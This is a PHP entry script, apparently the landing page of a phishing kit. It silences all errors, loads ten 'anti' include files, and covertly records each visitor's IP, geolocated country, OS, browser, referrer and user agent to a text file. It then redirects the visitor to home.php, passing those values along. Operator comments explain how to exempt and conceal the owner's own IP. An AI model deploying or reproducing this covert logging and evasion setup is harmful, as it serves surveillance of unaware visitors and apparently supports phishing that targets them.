<?php
error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');
include 'xMetri/anti0.php';
include 'xMetri/anti1.php';
include 'xMetri/anti2.php';
include 'xMetri/anti3.php';
include 'xMetri/anti4.php';
include 'xMetri/anti5.php';
include 'xMetri/anti6.php';
include 'xMetri/anti7.php';
include 'xMetri/anti8.php';
include 'xMetri/anti9.php';

$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
// Getting OS Name
function getOS() { 
    global $user_agent;
    $os_platform    =   "Unknown OS Platform";
    $os_array       =   array(
                            '/windows nt 10/i'     =>  'Windows 10',
                            '/windows nt 6.3/i'     =>  'Windows 8.1',
                            '/windows nt 6.2/i'     =>  'Windows 8',
                            '/windows nt 6.1/i'     =>  'Windows 7',
                            '/windows nt 6.0/i'     =>  'Windows Vista',
                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                            '/windows nt 5.1/i'     =>  'Windows XP',
                            '/windows xp/i'         =>  'Windows XP',
                            '/windows nt 5.0/i'     =>  'Windows 2000',
                            '/windows me/i'         =>  'Windows ME',
                            '/win98/i'              =>  'Windows 98',
                            '/win95/i'              =>  'Windows 95',
                            '/win16/i'              =>  'Windows 3.11',
                            '/macintosh|mac os x/i' =>  'Mac OS X',
                            '/mac_powerpc/i'        =>  'Mac OS 9',
                            '/linux/i'              =>  'Linux',
							'/kalilinux/i'          =>  'KaliLinux',
                            '/ubuntu/i'             =>  'Ubuntu',
                            '/iphone/i'             =>  'iPhone',
                            '/ipod/i'               =>  'iPod',
                            '/ipad/i'               =>  'iPad',
                            '/android/i'            =>  'Android',
                            '/blackberry/i'         =>  'BlackBerry',
                            '/webos/i'              =>  'Mobile',
							'/Windows Phone/i'      =>  'Windows Phone'
                        );
    foreach ($os_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }
    }   
    return $os_platform;
}
// END of Getting OS
//
// Get browser
function getBrowser() {
    global $user_agent;
    $browser        =   "Unknown Browser";
    $browser_array  =   array(
                            '/msie/i'       =>  'Internet Explorer',
                            '/firefox/i'    =>  'Firefox',
							'/Mozilla/i'	=>	'Mozilla',
							'/Mozilla/5.0/i'=>	'Mozilla',
                            '/safari/i'     =>  'Safari',
                            '/chrome/i'     =>  'Chrome',
                            '/edge/i'       =>  'Edge',
                            '/opera/i'      =>  'Opera',
							'/OPR/i'        =>  'Opera',
                            '/netscape/i'   =>  'Netscape',
                            '/maxthon/i'    =>  'Maxthon',
                            '/konqueror/i'  =>  'Konqueror',
							'/Bot/i'		=>	'BOT Browser',
							'/Valve Steam GameOverlay/i'  =>  'Steam',
                            '/mobile/i'     =>  'Handheld Browser'
                        );
    foreach ($browser_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $browser    =   $value;
        }
    }
    return $browser;
}
// END of getting browser
$user_os        =   getOS();
$user_browser   =   getBrowser();
// Comming soon part --- Maybe :D 
//$device_details =   "<strong>Browser: </strong>".$user_browser."<br /><strong>Operating System: </strong>".$user_os."";
// Getting visitor IP address
$ip = $_SERVER['REMOTE_ADDR'];
// Getting where visitor come
$site_refer = $_SERVER['HTTP_REFERER'];
	// If hes connected directly 
	if($site_refer == ""){
		$site = "dirrect connection";
	}
  // If he doesn't
	else{
		$site = $site_refer;
	}
  // Hide ownr's IP address
	$owner = "HIDE THIS IP ADDRESS";   //Change $owner for something else, cuz someone can simple read that by calling out $owner
  // change it for $absdfs5sd4 for example and change it down there 
	$owner_country = "YOUR COUNTRY TAG FOR YOUR IP ↑"; //This u can leave how it is.
  
	if($ip == $owner){ //Change it here 
		$ip = "Owner"; 
		$country = $owner_country;
	}
  //If that wasn't you, it woun't change IP address and it will find info about IP address
	else{
		$details = json_decode(file_get_contents("http://ipinfo.io/{$ip}"));
		$country = $details->country;
	}
	// Writing in to txt file
 $myfile = file_put_contents('./visites/visited-ips.txt',date("Y-m-d - H:i:s - "). $country. " ". $ip." | ". $user_os. " | ". $user_browser. " | Come from site :". $site. " | user agent:" .$user_agent .PHP_EOL , FILE_APPEND | LOCK_EX);
fclose($myfile);


$DIR = "home.php?ip=" . $ip . "&countryCode=". $country . "&OS=" . $user_os;


header("location:$DIR");


?>
    